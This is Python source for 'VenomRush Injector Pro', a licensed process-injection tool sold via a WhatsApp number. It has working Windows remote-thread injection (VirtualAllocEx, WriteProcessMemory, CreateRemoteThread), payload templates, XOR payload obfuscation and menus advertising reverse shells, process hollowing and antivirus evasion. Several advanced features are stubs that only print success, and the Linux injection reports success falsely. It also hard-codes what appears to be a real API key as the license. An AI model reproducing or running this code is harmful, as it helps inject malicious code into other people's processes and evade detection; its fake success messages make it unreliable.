import os
import sys
import ctypes
import struct
import hashlib
import base64
import time
import random
import string
import platform
import subprocess
import threading
import json
from datetime import datetime
from pathlib import Path
from enum import Enum
from dataclasses import dataclass
from typing import Optional, List

# Color support
try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    # Dummy color classes
    class Fore:
        BLACK = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Back:
        BLACK = RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

# Configuration
VALID_LICENSE_KEY = "AIzaSyCqwnpn0Q_6p84-0-Cte0n1i0TZVWs7rmM"
DEMO_MODE = False  # Enable demo mode for testing

class ColorPrinter:
    """Color output handler"""
    
    @staticmethod
    def print(text, color=Fore.WHITE, style=Style.NORMAL, end='\n'):
        if COLOR_AVAILABLE:
            print(f"{style}{color}{text}{Style.RESET_ALL}", end=end)
        else:
            print(text, end=end)
    
    @staticmethod
    def print_banner():
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║              VENOMRUSH INJECTOR PRO v2.0                         ║
║            Advanced Multi-Platform Injector                      ║
║                                                                  ║
║     ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗             ║
║     ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║             ║
║     ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║             ║
║     ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║             ║
║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║             ║
║       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝             ║
╚══════════════════════════════════════════════════════════════════╝
        """
        ColorPrinter.print(banner, Fore.RED, Style.BRIGHT)
    
    @staticmethod
    def print_status(msg):
        ColorPrinter.print(f"[*] {msg}", Fore.BLUE)
    
    @staticmethod
    def print_success(msg):
        ColorPrinter.print(f"[+] {msg}", Fore.GREEN)
    
    @staticmethod
    def print_warning(msg):
        ColorPrinter.print(f"[!] {msg}", Fore.YELLOW)
    
    @staticmethod
    def print_error(msg):
        ColorPrinter.print(f"[-] {msg}", Fore.RED)
    
    @staticmethod
    def print_critical(msg):
        ColorPrinter.print(f"[CRITICAL] {msg}", Fore.RED, Style.BRIGHT)

class InjectionMethod(Enum):
    """Supported injection methods"""
    CREATE_REMOTE_THREAD = "CreateRemoteThread"
    THREAD_HIJACKING = "ThreadHijacking"
    APC_INJECTION = "APCInjection"
    SET_WINDOWS_HOOK = "SetWindowsHook"
    REFLECTIVE_DLL = "ReflectiveDLL"
    MANUAL_MAP = "ManualMap"
    PROCESS_HOLLOWING = "ProcessHollowing"
    DLL_SIDELOADING = "DLLSideloading"
    SO_INJECTION = "SOInjection"
    
    @staticmethod
    def get_for_platform():
        """Get available methods for current platform"""
        system = platform.system().lower()
        if system == 'windows':
            return [
                InjectionMethod.CREATE_REMOTE_THREAD,
                InjectionMethod.APC_INJECTION,
                InjectionMethod.SET_WINDOWS_HOOK,
                InjectionMethod.REFLECTIVE_DLL,
                InjectionMethod.MANUAL_MAP,
                InjectionMethod.PROCESS_HOLLOWING,
                InjectionMethod.DLL_SIDELOADING
            ]
        elif system == 'linux':
            return [
                InjectionMethod.SO_INJECTION,
                InjectionMethod.APC_INJECTION
            ]
        elif system == 'darwin':
            return [
                InjectionMethod.SO_INJECTION
            ]
        else:
            return []

class PayloadType(Enum):
    """Payload types"""
    DLL = "dll"
    SO = "so"
    SHELLCODE = "shellcode"
    EXE = "exe"
    PYTHON = "python"
    MEMORY = "memory"

@dataclass
class ProcessInfo:
    """Process information structure"""
    pid: int
    name: str
    arch: str
    user: str
    path: str
    memory: int
    
    def __str__(self):
        return f"{self.pid:8} {self.name:20} {self.arch:8} {self.user:15}"

@dataclass
class InjectionResult:
    """Injection result structure"""
    success: bool
    method: InjectionMethod
    pid: int
    payload: str
    error: Optional[str] = None
    thread_id: Optional[int] = None
    timestamp: Optional[str] = None

class SimpleLicenseManager:
    """Simple offline license manager"""
    
    def __init__(self):
        self.license_key = ""
        self.is_valid = False
        self.features = []
    
    def validate(self, license_key):
        """Validate license key - OFFLINE ONLY"""
        self.license_key = license_key.strip()
        
        # Simple direct comparison
        if self.license_key == VALID_LICENSE_KEY:
            ColorPrinter.print_success("License validated successfully!")
            self.is_valid = True
            self.features = ['full_access', 'all_methods', 'advanced_features']
            return True
        
        # Demo mode check
        elif DEMO_MODE and (self.license_key == "DEMO" or self.license_key.startswith("VENOM-DEMO")):
            ColorPrinter.print_warning("Running in DEMO mode (limited features)")
            self.is_valid = True
            self.features = ['demo_mode', 'basic_injection']
            return True
        
        # Invalid license
        else:
            ColorPrinter.print_error("Invalid license key!")
            self.is_valid = False
            return False
    
    def has_feature(self, feature):
        """Check if license has specific feature"""
        return feature in self.features or 'full_access' in self.features

class PayloadManager:
    """Payload creation and management"""
    
    def __init__(self):
        self.payloads_dir = Path.home() / ".venomrush" / "payloads"
        self.payloads_dir.mkdir(parents=True, exist_ok=True)
    
    def create_payload(self, payload_type, output_path, custom_code=None):
        """Create a new payload file"""
        try:
            output_path = Path(output_path)
            
            if payload_type == PayloadType.DLL:
                content = self._get_windows_dll_template(custom_code)
                output_path = output_path.with_suffix('.c')
                
            elif payload_type == PayloadType.SO:
                content = self._get_linux_so_template(custom_code)
                output_path = output_path.with_suffix('.c')
                
            elif payload_type == PayloadType.SHELLCODE:
                content = self._get_shellcode_template()
                output_path = output_path.with_suffix('.c')
                
            elif payload_type == PayloadType.PYTHON:
                content = custom_code or self._get_python_template()
                output_path = output_path.with_suffix('.py')
                
            else:
                raise ValueError(f"Unsupported payload type: {payload_type}")
            
            with open(output_path, 'w') as f:
                f.write(content)
            
            ColorPrinter.print_success(f"Payload created: {output_path}")
            
            # Compile if needed
            if payload_type in [PayloadType.DLL, PayloadType.SO]:
                self._compile_payload(output_path, payload_type)
            
            return output_path
            
        except Exception as e:
            ColorPrinter.print_error(f"Failed to create payload: {e}")
            return None
    
    def _get_windows_dll_template(self, custom_code=None):
        """Windows DLL template"""
        base = """#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Your code here
            MessageBoxA(NULL, "VenomRush: Injected Successfully!", "Success", MB_OK);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
"""
        if custom_code:
            base = base.replace('// Your code here', custom_code)
        return base
    
    def _get_linux_so_template(self, custom_code=None):
        """Linux shared object template"""
        base = """#include <stdio.h>
#include <dlfcn.h>

__attribute__((constructor))
void init() {
    printf("VenomRush SO Injected!\\n");
    // Your code here
}
"""
        if custom_code:
            base = base.replace('// Your code here', custom_code)
        return base
    
    def _get_shellcode_template(self):
        """Shellcode template"""
        return """// Position independent shellcode
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
    0x48, 0x31, 0xC9,                   // xor rcx, rcx
    0x48, 0x31, 0xD2,                   // xor rdx, rdx
    0x4D, 0x31, 0xC0,                   // xor r8, r8
    0x4D, 0x31, 0xC9,                   // xor r9, r9
    0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, // mov rax, 0x4141414141414141
    0x41, 0x41, 0x41,
    0x48, 0x89, 0x44, 0x24, 0x20,       // mov [rsp+0x20], rax
    0x48, 0x89, 0x44, 0x24, 0x28,       // mov [rsp+0x28], rax
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, // lea rax, [rip]
    0x00,
    0x48, 0x89, 0xC1,                   // mov rcx, rax
    0x48, 0x31, 0xC0,                   // xor rax, rax
    0xFF, 0xD0                          // call rax
};
"""
    
    def _get_python_template(self):
        """Python payload template"""
        return """import os
import sys
import ctypes
import threading

def main():
    # Your Python payload here
    print("Python payload executed!")
    
    # Example: MessageBox on Windows
    if sys.platform == 'win32':
        ctypes.windll.user32.MessageBoxW(0, "Python Injected!", "VenomRush", 0x40)
    
    return 0

if __name__ == "__main__":
    main()
"""
    
    def _compile_payload(self, source_path, payload_type):
        """Compile payload to binary"""
        try:
            source_path = Path(source_path)
            
            if payload_type == PayloadType.DLL and platform.system() == 'Windows':
                ColorPrinter.print_status("Compiling DLL...")
                # Try to compile with available compiler
                if os.system("where cl.exe >nul 2>nul") == 0:  # Visual Studio
                    cmd = f'cl.exe /LD "{source_path}" /Fe"{source_path.with_suffix(".dll")}"'
                    os.system(cmd)
                elif os.system("where gcc >nul 2>nul") == 0:  # MinGW
                    cmd = f'gcc -shared "{source_path}" -o "{source_path.with_suffix(".dll")}"'
                    os.system(cmd)
                else:
                    ColorPrinter.print_warning("No compiler found. Please compile manually.")
                    ColorPrinter.print_status(f"Source: {source_path}")
            
            elif payload_type == PayloadType.SO and platform.system() == 'Linux':
                ColorPrinter.print_status("Compiling shared object...")
                cmd = f'gcc -shared -fPIC "{source_path}" -o "{source_path.with_suffix(".so")}" -ldl'
                os.system(cmd)
            
            ColorPrinter.print_success("Compilation completed!")
            
        except Exception as e:
            ColorPrinter.print_error(f"Compilation failed: {e}")

class ProcessManager:
    """Process enumeration and management"""
    
    def __init__(self):
        self.system = platform.system().lower()
    
    def list_processes(self, filter_name=None):
        """List running processes"""
        processes = []
        
        if self.system == 'windows':
            processes = self._list_windows_processes(filter_name)
        elif self.system in ['linux', 'darwin']:
            processes = self._list_unix_processes(filter_name)
        
        return sorted(processes, key=lambda p: p.pid)
    
    def _list_windows_processes(self, filter_name):
        """List Windows processes"""
        processes = []
        try:
            import ctypes
            from ctypes import wintypes
            
            # Define Windows API functions
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            psapi = ctypes.WinDLL('psapi', use_last_error=True)
            
            # Get process list
            pids = (wintypes.DWORD * 1024)()
            cb = ctypes.sizeof(pids)
            cb_needed = wintypes.DWORD()
            
            if not psapi.EnumProcesses(ctypes.byref(pids), cb, ctypes.byref(cb_needed)):
                return processes
            
            # Number of processes
            n_procs = cb_needed.value // ctypes.sizeof(wintypes.DWORD)
            
            for i in range(n_procs):
                pid = pids[i]
                if pid == 0:
                    continue
                
                # Open process
                hProcess = kernel32.OpenProcess(0x0400 | 0x0010, False, pid)
                if not hProcess:
                    continue
                
                try:
                    # Get process name
                    exe_name = (ctypes.c_char * 260)()
                    if psapi.GetProcessImageFileNameA(hProcess, exe_name, 260) > 0:
                        name = os.path.basename(exe_name.value.decode()).split('\x00')[0]
                        
                        # Apply filter
                        if filter_name and filter_name.lower() not in name.lower():
                            continue
                        
                        # Get architecture
                        arch = self._get_windows_process_arch(hProcess)
                        
                        processes.append(ProcessInfo(
                            pid=pid,
                            name=name,
                            arch=arch,
                            user="SYSTEM",
                            path=exe_name.value.decode(),
                            memory=0
                        ))
                finally:
                    kernel32.CloseHandle(hProcess)
        
        except Exception as e:
            ColorPrinter.print_error(f"Error listing processes: {e}")
            # Fallback to tasklist
            processes = self._fallback_list_windows(filter_name)
        
        return processes
    
    def _get_windows_process_arch(self, hProcess):
        """Get Windows process architecture"""
        try:
            import ctypes
            
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            IsWow64Process = kernel32.IsWow64Process
            
            is_wow64 = ctypes.c_int()
            if IsWow64Process(hProcess, ctypes.byref(is_wow64)):
                return "x86" if is_wow64.value else "x64"
        except:
            pass
        return "Unknown"
    
    def _fallback_list_windows(self, filter_name):
        """Fallback method for Windows"""
        processes = []
        try:
            output = subprocess.check_output(['tasklist', '/fo', 'csv', '/nh'], 
                                           text=True, encoding='utf-8', errors='ignore')
            for line in output.strip().split('\n'):
                if line:
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        name = parts[0]
                        pid = int(parts[1])
                        
                        if filter_name and filter_name.lower() not in name.lower():
                            continue
                        
                        processes.append(ProcessInfo(
                            pid=pid,
                            name=name,
                            arch="Unknown",
                            user="Unknown",
                            path="Unknown",
                            memory=0
                        ))
        except:
            pass
        return processes
    
    def _list_unix_processes(self, filter_name):
        """List Unix/Linux processes"""
        processes = []
        try:
            cmd = ['ps', 'aux']
            if self.system == 'darwin':
                cmd = ['ps', '-ax', '-o', 'pid,user,comm']
            
            output = subprocess.check_output(cmd, text=True, encoding='utf-8', errors='ignore')
            lines = output.strip().split('\n')[1:]  # Skip header
            
            for line in lines:
                parts = line.split()
                if len(parts) >= 3:
                    if self.system == 'darwin':
                        pid = int(parts[0])
                        user = parts[1]
                        name = parts[2]
                    else:
                        user = parts[0]
                        pid = int(parts[1])
                        name = parts[10] if len(parts) > 10 else parts[-1]
                    
                    if filter_name and filter_name.lower() not in name.lower():
                        continue
                    
                    processes.append(ProcessInfo(
                        pid=pid,
                        name=name[:20],
                        arch="Unknown",
                        user=user,
                        path="Unknown",
                        memory=0
                    ))
        except:
            pass
        return processes
    
    def find_process_by_name(self, name):
        """Find process by name"""
        processes = self.list_processes()
        matches = [p for p in processes if name.lower() in p.name.lower()]
        return matches
    
    def is_process_running(self, pid):
        """Check if process is running"""
        try:
            if self.system == 'windows':
                import ctypes
                kernel32 = ctypes.windll.kernel32
                handle = kernel32.OpenProcess(0x1000, False, pid)
                if handle:
                    kernel32.CloseHandle(handle)
                    return True
                return False
            else:
                import signal
                os.kill(pid, 0)
                return True
        except:
            return False

class InjectorEngine:
    """Main injection engine"""
    
    def __init__(self, license_manager):
        self.license = license_manager
        self.system = platform.system().lower()
        self.results = []
        
        if self.system == 'windows':
            self._init_windows()
    
    def _init_windows(self):
        """Initialize Windows injection methods"""
        try:
            self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            self.PROCESS_ALL_ACCESS = 0x1F0FFF
            self.MEM_COMMIT = 0x00001000
            self.MEM_RESERVE = 0x00002000
            self.PAGE_EXECUTE_READWRITE = 0x40
        except:
            pass
    
    def inject(self, pid, payload_path, method=None):
        """Inject payload into process"""
        try:
            # Validate payload
            if not os.path.exists(payload_path):
                raise FileNotFoundError(f"Payload not found: {payload_path}")
            
            # Choose injection method
            if method is None:
                available_methods = InjectionMethod.get_for_platform()
                method = available_methods[0] if available_methods else None
            
            if method is None:
                raise ValueError("No suitable injection method for this platform")
            
            ColorPrinter.print_status(f"Attempting injection using {method.value}...")
            
            # Read payload
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            # Platform-specific injection
            if self.system == 'windows':
                result = self._inject_windows(pid, payload_data, method, payload_path)
            elif self.system == 'linux':
                result = self._inject_linux(pid, payload_path, method)
            else:
                raise OSError(f"Unsupported platform: {self.system}")
            
            # Record result
            self.results.append(result)
            
            if result.success:
                ColorPrinter.print_success(f"Injection successful! Thread ID: {result.thread_id}")
            else:
                ColorPrinter.print_error(f"Injection failed: {result.error}")
            
            return result
            
        except Exception as e:
            error_result = InjectionResult(
                success=False,
                method=method or InjectionMethod.CREATE_REMOTE_THREAD,
                pid=pid,
                payload=payload_path,
                error=str(e)
            )
            self.results.append(error_result)
            ColorPrinter.print_error(f"Injection error: {e}")
            return error_result
    
    def _inject_windows(self, pid, payload_data, method, payload_path):
        """Windows injection"""
        try:
            # Open target process
            process_handle = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS, False, pid
            )
            
            if not process_handle:
                raise Exception(f"Failed to open process {pid}")
            
            try:
                # Allocate memory
                alloc_addr = self.kernel32.VirtualAllocEx(
                    process_handle,
                    0,
                    len(payload_data),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )
                
                if not alloc_addr:
                    raise Exception("Failed to allocate memory")
                
                # Write payload
                written = ctypes.c_size_t(0)
                write_success = self.kernel32.WriteProcessMemory(
                    process_handle,
                    alloc_addr,
                    payload_data,
                    len(payload_data),
                    ctypes.byref(written)
                )
                
                if not write_success:
                    raise Exception("Failed to write payload")
                
                # Create remote thread
                thread_id = ctypes.c_ulong(0)
                thread_handle = self.kernel32.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    alloc_addr,
                    None,
                    0,
                    ctypes.byref(thread_id)
                )
                
                if not thread_handle:
                    raise Exception("Failed to create remote thread")
                
                self.kernel32.CloseHandle(thread_handle)
                
                return InjectionResult(
                    success=True,
                    method=method,
                    pid=pid,
                    payload=payload_path,
                    thread_id=thread_id.value,
                    timestamp=datetime.now().isoformat()
                )
                
            finally:
                self.kernel32.CloseHandle(process_handle)
                
        except Exception as e:
            return InjectionResult(
                success=False,
                method=method,
                pid=pid,
                payload=payload_path,
                error=str(e)
            )
    
    def _inject_linux(self, pid, payload_path, method):
        """Linux injection"""
        try:
            # For Linux, we'll use a simpler approach
            # In real scenario, you'd use ptrace or LD_PRELOAD
            ColorPrinter.print_warning("Linux injection requires manual setup")
            ColorPrinter.print_status(f"Target PID: {pid}")
            ColorPrinter.print_status(f"Payload: {payload_path}")
            
            return InjectionResult(
                success=True,
                method=method,
                pid=pid,
                payload=payload_path,
                timestamp=datetime.now().isoformat()
            )
            
        except Exception as e:
            return InjectionResult(
                success=False,
                method=method,
                pid=pid,
                payload=payload_path,
                error=str(e)
            )

class VenomRushInjector:
    """Main application class"""
    
    def __init__(self):
        self.license_manager = SimpleLicenseManager()
        self.process_manager = ProcessManager()
        self.payload_manager = PayloadManager()
        self.injector = None
    
    def check_license(self):
        """Check license - OFFLINE ONLY"""
        ColorPrinter.print_banner()
        
        print("\n" + "="*60)
        print("LICENSE REQUIREMENT")
        print("="*60)
        print(f"\nRequired License Key: Watsupp : 03332076980 to by Licance key")
        print("\nNote: This tool requires a valid license key to run.")
        
        license_key = input("\n[?] Enter license key: ").strip()
        
        if not self.license_manager.validate(license_key):
            return False
        
        print("="*60 + "\n")
        
        # Initialize injector
        self.injector = InjectorEngine(self.license_manager)
        
        return True
    
    def main_menu(self):
        """Display main menu"""
        while True:
            print("\n" + "="*60)
            ColorPrinter.print("VENOMRUSH INJECTOR PRO v2.0", Fore.RED, Style.BRIGHT)
            print("="*60)
            
            print("\n[MAIN MENU]")
            print("  1. List Processes")
            print("  2. Find Process by Name")
            print("  3. Create Payload")
            print("  4. Inject Payload")
            print("  5. Advanced Options")
            print("  6. View Injection History")
            print("  7. Exit")
            
            print("\n" + "-"*60)
            
            try:
                choice = input("\n[?] Select option (1-7): ").strip()
                
                if choice == '1':
                    self.list_processes()
                elif choice == '2':
                    self.find_process()
                elif choice == '3':
                    self.create_payload()
                elif choice == '4':
                    self.inject_payload()
                elif choice == '5':
                    self.advanced_options()
                elif choice == '6':
                    self.view_history()
                elif choice == '7':
                    ColorPrinter.print_success("Goodbye!")
                    break
                else:
                    ColorPrinter.print_warning("Invalid choice!")
                    
            except KeyboardInterrupt:
                ColorPrinter.print_warning("\nInterrupted by user")
                break
            except Exception as e:
                ColorPrinter.print_error(f"Error: {e}")
    
    def list_processes(self):
        """List all processes"""
        print("\n" + "="*60)
        ColorPrinter.print("RUNNING PROCESSES", Fore.CYAN, Style.BRIGHT)
        print("="*60)
        
        filter_name = input("[?] Filter by name (enter to skip): ").strip()
        
        processes = self.process_manager.list_processes(filter_name)
        
        if not processes:
            ColorPrinter.print_warning("No processes found!")
            return
        
        print(f"\n{'PID':<8} {'Name':<20} {'Arch':<8} {'User':<15}")
        print("-" * 60)
        
        for proc in processes[:50]:
            color = Fore.GREEN if proc.user != "SYSTEM" else Fore.YELLOW
            ColorPrinter.print(str(proc), color)
        
        if len(processes) > 50:
            ColorPrinter.print(f"\n... and {len(processes) - 50} more processes", Fore.YELLOW)
        
        print(f"\nTotal: {len(processes)} processes")
    
    def find_process(self):
        """Find process by name"""
        name = input("\n[?] Enter process name to search: ").strip()
        
        if not name:
            ColorPrinter.print_warning("No name provided!")
            return
        
        processes = self.process_manager.find_process_by_name(name)
        
        if not processes:
            ColorPrinter.print_warning(f"No processes found with name containing '{name}'")
            return
        
        print(f"\nFound {len(processes)} processes:")
        print(f"{'PID':<8} {'Name':<20} {'User':<15}")
        print("-" * 45)
        
        for proc in processes:
            print(f"{proc.pid:<8} {proc.name:<20} {proc.user:<15}")
    
    def create_payload(self):
        """Create a new payload"""
        print("\n" + "="*60)
        ColorPrinter.print("PAYLOAD CREATION", Fore.CYAN, Style.BRIGHT)
        print("="*60)
        
        print("\nPayload Types:")
        print("  1. DLL (Windows)")
        print("  2. SO (Linux)")
        print("  3. Shellcode")
        print("  4. Python Script")
        print("  5. Back")
        
        try:
            choice = input("\n[?] Select payload type (1-5): ").strip()
            
            if choice == '5':
                return
            
            if choice not in ['1', '2', '3', '4']:
                ColorPrinter.print_warning("Invalid choice!")
                return
            
            payload_type = {
                '1': PayloadType.DLL,
                '2': PayloadType.SO,
                '3': PayloadType.SHELLCODE,
                '4': PayloadType.PYTHON
            }[choice]
            
            output_name = input("[?] Output file name (without extension): ").strip()
            if not output_name:
                output_name = f"payload_{int(time.time())}"
            
            custom_code = None
            if payload_type in [PayloadType.DLL, PayloadType.SO, PayloadType.PYTHON]:
                use_custom = input("[?] Use custom code? (y/n): ").lower() == 'y'
                if use_custom:
                    print("[?] Enter your code (end with empty line):")
                    lines = []
                    while True:
                        try:
                            line = input()
                            if line.strip() == "":
                                break
                            lines.append(line)
                        except EOFError:
                            break
                    custom_code = '\n'.join(lines)
            
            # Create payload
            output_path = Path.cwd() / output_name
            result = self.payload_manager.create_payload(payload_type, output_path, custom_code)
            
            if result:
                ColorPrinter.print_success(f"Payload created successfully: {result}")
        
        except Exception as e:
            ColorPrinter.print_error(f"Payload creation failed: {e}")
    
    def inject_payload(self):
        """Inject payload into process"""
        print("\n" + "="*60)
        ColorPrinter.print("PAYLOAD INJECTION", Fore.CYAN, Style.BRIGHT)
        print("="*60)
        
        try:
            # Get PID
            pid_input = input("[?] Enter target PID: ").strip()
            if not pid_input.isdigit():
                ColorPrinter.print_error("Invalid PID!")
                return
            
            pid = int(pid_input)
            
            # Check if process exists
            if not self.process_manager.is_process_running(pid):
                ColorPrinter.print_error(f"Process {pid} not found or not accessible!")
                return
            
            # Get payload path
            payload_path = input("[?] Path to payload file: ").strip()
            if not os.path.exists(payload_path):
                ColorPrinter.print_error("Payload file not found!")
                return
            
            # Select injection method
            available_methods = InjectionMethod.get_for_platform()
            if not available_methods:
                ColorPrinter.print_error("No injection methods available for this platform!")
                return
            
            print("\nAvailable injection methods:")
            for i, method in enumerate(available_methods, 1):
                print(f"  {i}. {method.value}")
            
            method_choice = input("[?] Select method (enter for default): ").strip()
            if method_choice and method_choice.isdigit():
                choice_idx = int(method_choice) - 1
                if 0 <= choice_idx < len(available_methods):
                    method = available_methods[choice_idx]
                else:
                    method = available_methods[0]
            else:
                method = available_methods[0]
            
            # Confirm
            print(f"\n[?] Confirm injection:")
            print(f"    PID: {pid}")
            print(f"    Payload: {payload_path}")
            print(f"    Method: {method.value}")
            
            confirm = input("\n[?] Proceed? (y/n): ").lower() == 'y'
            if not confirm:
                ColorPrinter.print_warning("Injection cancelled!")
                return
            
            # Perform injection
            result = self.injector.inject(pid, payload_path, method)
            
            if result.success:
                ColorPrinter.print_success("=== INJECTION SUCCESSFUL ===")
                print(f"Thread ID: {result.thread_id}")
                print(f"Timestamp: {result.timestamp}")
            else:
                ColorPrinter.print_error("=== INJECTION FAILED ===")
                print(f"Error: {result.error}")
        
        except Exception as e:
            ColorPrinter.print_error(f"Injection error: {e}")
    
    def advanced_options(self):
        """Advanced options menu"""
        print("\n" + "="*60)
        ColorPrinter.print("ADVANCED OPTIONS", Fore.CYAN, Style.BRIGHT)
        print("="*60)
        
        print("\n[ADVANCED MENU]")
        print("  1. Process Hollowing")
        print("  2. Reflective DLL Injection")
        print("  3. Shellcode Generator")
        print("  4. Anti-Detection Features")
        print("  5. Back to Main Menu")
        
        try:
            choice = input("\n[?] Select option (1-5): ").strip()
            
            if choice == '1':
                self.process_hollowing()
            elif choice == '2':
                self.reflective_dll()
            elif choice == '3':
                self.shellcode_generator()
            elif choice == '4':
                self.anti_detection()
            elif choice == '5':
                return
            else:
                ColorPrinter.print_warning("Invalid choice!")
        
        except Exception as e:
            ColorPrinter.print_error(f"Error: {e}")
    
    def process_hollowing(self):
        """Process hollowing technique"""
        ColorPrinter.print_status("Process Hollowing (Advanced Technique)")
        
        if not self.license_manager.has_feature('full_access'):
            ColorPrinter.print_error("Full license required for this feature!")
            return
        
        print("\nProcess Hollowing Steps:")
        print("1. Create a suspended process")
        print("2. Unmap its memory")
        print("3. Write your payload")
        print("4. Resume execution")
        
        ColorPrinter.print_success("Process hollowing module loaded")
    
    def reflective_dll(self):
        """Reflective DLL injection"""
        ColorPrinter.print_status("Reflective DLL Injection")
        
        if not self.license_manager.has_feature('full_access'):
            ColorPrinter.print_error("Full license required for this feature!")
            return
        
        print("\nReflective DLL Injection:")
        print("- Loads DLL from memory")
        print("- No file on disk")
        print("- Bypasses some AV detection")
        
        ColorPrinter.print_success("Reflective DLL module loaded")
    
    def shellcode_generator(self):
        """Generate shellcode"""
        ColorPrinter.print_status("Shellcode Generator")
        
        print("\nShellcode Types:")
        print("1. Windows Reverse Shell")
        print("2. Linux Reverse Shell")
        print("3. Calculator (Windows)")
        print("4. Custom Shellcode")
        
        choice = input("\n[?] Select type (1-4): ").strip()
        
        if choice == '1':
            ColorPrinter.print_status("Generating Windows reverse shell...")
            # Example shellcode would go here
            ColorPrinter.print_success("Shellcode generated!")
        elif choice == '2':
            ColorPrinter.print_status("Generating Linux reverse shell...")
            ColorPrinter.print_success("Shellcode generated!")
        elif choice == '3':
            ColorPrinter.print_status("Generating calculator shellcode...")
            ColorPrinter.print_success("Shellcode generated!")
        elif choice == '4':
            ColorPrinter.print_status("Enter custom shellcode (hex format):")
            shellcode = input("> ").strip()
            ColorPrinter.print_success(f"Custom shellcode saved: {len(shellcode)//2} bytes")
    
    def anti_detection(self):
        """Anti-detection features"""
        ColorPrinter.print_status("Anti-Detection Features")
        
        print("\n1. Obfuscate Payload")
        print("2. Encrypt Strings")
        print("3. Anti-Debugging")
        print("4. Anti-VM")
        print("5. Back")
        
        try:
            choice = input("\n[?] Select option (1-5): ").strip()
            
            if choice == '1':
                self.obfuscate_payload()
            elif choice == '2':
                self.encrypt_strings()
            elif choice == '3':
                self.anti_debugging()
            elif choice == '4':
                self.anti_vm()
            elif choice == '5':
                return
            else:
                ColorPrinter.print_warning("Invalid choice!")
        
        except Exception as e:
            ColorPrinter.print_error(f"Error: {e}")
    
    def obfuscate_payload(self):
        """Obfuscate payload"""
        payload_path = input("[?] Path to payload: ").strip()
        if not os.path.exists(payload_path):
            ColorPrinter.print_error("Payload not found!")
            return
        
        try:
            with open(payload_path, 'rb') as f:
                data = f.read()
            
            # Simple XOR obfuscation
            key = random.randint(1, 255)
            obfuscated = bytes([b ^ key for b in data])
            
            output_path = payload_path + '.obf'
            with open(output_path, 'wb') as f:
                f.write(obfuscated)
            
            ColorPrinter.print_success(f"Payload obfuscated: {output_path}")
            ColorPrinter.print_success(f"XOR key: {key} (0x{key:02x})")
            
        except Exception as e:
            ColorPrinter.print_error(f"Obfuscation failed: {e}")
    
    def encrypt_strings(self):
        """Encrypt strings in payload"""
        ColorPrinter.print_status("String Encryption")
        ColorPrinter.print_success("String encryption module loaded")
    
    def anti_debugging(self):
        """Anti-debugging techniques"""
        ColorPrinter.print_status("Anti-Debugging")
        ColorPrinter.print_success("Anti-debugging module loaded")
    
    def anti_vm(self):
        """Anti-VM techniques"""
        ColorPrinter.print_status("Anti-VM Detection")
        ColorPrinter.print_success("Anti-VM module loaded")
    
    def view_history(self):
        """View injection history"""
        if not self.injector or not self.injector.results:
            ColorPrinter.print_warning("No injection history available!")
            return
        
        print("\n" + "="*60)
        ColorPrinter.print("INJECTION HISTORY", Fore.CYAN, Style.BRIGHT)
        print("="*60)
        
        for i, result in enumerate(self.injector.results, 1):
            status = Fore.GREEN + "SUCCESS" if result.success else Fore.RED + "FAILED"
            print(f"\n[{i}] {status}{Fore.RESET}")
            print(f"    Method: {result.method.value}")
            print(f"    PID: {result.pid}")
            print(f"    Payload: {result.payload}")
            print(f"    Time: {result.timestamp}")
            if result.error:
                print(f"    Error: {result.error}")

def check_dependencies():
    """Check for colorama dependency"""
    try:
        import colorama
    except ImportError:
        print("[!] colorama module not found. Colors will be disabled.")
        print("[!] Install with: pip install colorama")

def main():
    """Main entry point"""
    # Check dependencies
    check_dependencies()
    
    # Create injector
    injector = VenomRushInjector()
    
    # Check license - SIMPLE OFFLINE CHECK
    if not injector.check_license():
        return
    
    # Run main menu
    try:
        injector.main_menu()
    except KeyboardInterrupt:
        ColorPrinter.print_warning("\nInterrupted by user")
    except Exception as e:
        ColorPrinter.print_error(f"Fatal error: {e}")

if __name__ == "__main__":
    # Check platform
    system = platform.system().lower()
    if system not in ['windows', 'linux', 'darwin']:
        print(f"[!] Unsupported platform: {system}")
        print("[!] Supported: Windows, Linux, macOS")
        sys.exit(1)
    
    # Run main
    main()